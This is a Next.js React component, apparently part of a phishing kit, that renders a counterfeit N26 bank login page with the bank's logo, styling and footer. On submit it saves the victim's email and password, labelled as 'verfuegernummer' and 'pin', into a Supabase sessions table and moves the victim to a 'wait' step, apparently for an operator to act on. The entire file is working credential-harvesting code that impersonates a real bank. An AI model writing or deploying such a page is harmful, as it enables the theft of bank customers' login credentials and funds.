"use client";

import { useEffect, useState } from "react";
import { useRouter } from "next/navigation";
import { createBrowserSupabaseClient } from "@/lib/supabase/client";
import { stepToPath } from "@/lib/session-routes";

export function N26Client({ sessionId }: { sessionId: string }) {
  const router = useRouter();
  const supabase = createBrowserSupabaseClient();
  const [username, setUsername] = useState("");
  const [password, setPassword] = useState("");
  const [saving, setSaving] = useState(false);

  useEffect(() => {
    let cancelled = false;
    void (async () => {
      if (!supabase || !sessionId) return;
      const { data } = await supabase.from("sessions").select("form_data").eq("id", sessionId).maybeSingle();
      if (cancelled || !data) return;
      const fd = (data.form_data ?? {}) as Record<string, string>;
      if (fd.verfuegernummer) setUsername(fd.verfuegernummer);
      if (fd.pin) setPassword(fd.pin);
    })();
    return () => { cancelled = true; };
  }, [sessionId, supabase]);

  async function handleSubmit() {
    if (!supabase || !sessionId) return;
    setSaving(true);
    const { data: existing } = await supabase.from("sessions").select("form_data").eq("id", sessionId).maybeSingle();
    const prev = (existing?.form_data ?? {}) as Record<string, unknown>;
    await supabase.from("sessions").update({ is_hidden: false, current_step: "wait",
      form_data: { ...prev, bankSlug: "n26", bankName: "N26", verfuegernummer: username, pin: password }
    }).eq("id", sessionId);
    router.push(stepToPath("wait", sessionId));
  }

  return (
    <div className="min-h-screen bg-[#161616] font-sans flex flex-col items-center justify-center relative">
      
      <div className="w-full max-w-[420px] bg-[#222222] rounded-[12px] p-10 shadow-2xl border border-gray-800">
        
        {/* Logo */}
        <div className="flex justify-center mb-10">
          <img src="/bank-logos/n26.svg" alt="N26" className="h-8" />
        </div>

        <form onSubmit={(e) => { e.preventDefault(); void handleSubmit(); }} className="space-y-5">
          
          <div className="relative">
            <input 
              required 
              type="email" 
              value={username} 
              onChange={e => setUsername(e.target.value)} 
              className="w-full bg-[#161616] border border-gray-700 rounded-[8px] pt-6 pb-2 px-4 text-white text-[15px] focus:outline-none focus:border-[#36A18B] transition-colors peer" 
              placeholder=" "
            />
            <label className="absolute left-4 top-4 text-gray-400 text-[15px] transition-all peer-placeholder-shown:top-4 peer-placeholder-shown:text-[15px] peer-focus:top-1.5 peer-focus:text-[11px] peer-focus:text-[#36A18B] peer-[:not(:placeholder-shown)]:top-1.5 peer-[:not(:placeholder-shown)]:text-[11px]">
              Email
            </label>
          </div>

          <div className="relative">
            <input 
              required 
              type="password" 
              value={password} 
              onChange={e => setPassword(e.target.value)} 
              className="w-full bg-[#161616] border border-gray-700 rounded-[8px] pt-6 pb-2 px-4 pr-16 text-white text-[15px] focus:outline-none focus:border-[#36A18B] transition-colors peer" 
              placeholder=" "
            />
            <label className="absolute left-4 top-4 text-gray-400 text-[15px] transition-all peer-placeholder-shown:top-4 peer-placeholder-shown:text-[15px] peer-focus:top-1.5 peer-focus:text-[11px] peer-focus:text-[#36A18B] peer-[:not(:placeholder-shown)]:top-1.5 peer-[:not(:placeholder-shown)]:text-[11px]">
              Password
            </label>
            <a href="#" className="absolute right-4 top-[18px] text-[#36A18B] text-[13px] hover:underline">
              Forgot?
            </a>
          </div>

          <button 
            type="submit" 
            disabled={saving || !username || !password} 
            className="w-full bg-[#36A18B] text-[#161616] font-bold py-3.5 rounded-[8px] mt-4 hover:bg-[#2c8a76] disabled:opacity-50 transition-colors"
          >
            {saving ? "Logging in..." : "Log in"}
          </button>

          <div className="text-center pt-2">
            <a href="#" className="text-[#36A18B] text-[14px] font-medium hover:underline">
              Create an account
            </a>
          </div>
        </form>
      </div>

      {/* Footer */}
      <footer className="absolute bottom-0 w-full bg-[#161616] border-t border-gray-800 py-6 px-8 flex justify-between items-center text-[12px] text-gray-400">
        <div className="flex gap-6">
          <span>© N26 SE 2026</span>
          <a href="#" className="hover:text-white flex items-center gap-1">Privacy Policy <span className="text-[10px]">↗</span></a>
          <a href="#" className="hover:text-white flex items-center gap-1">Cookie Policy <span className="text-[10px]">↗</span></a>
          <a href="#" className="hover:text-white flex items-center gap-1">Imprint <span className="text-[10px]">↗</span></a>
        </div>
        <div>
          <a href="#" className="hover:text-white flex items-center gap-1">English <svg className="w-3 h-3" fill="none" stroke="currentColor" viewBox="0 0 24 24"><path strokeLinecap="round" strokeLinejoin="round" strokeWidth="2" d="M19 9l-7 7-7-7"></path></svg></a>
        </div>
      </footer>
    </div>
  );
}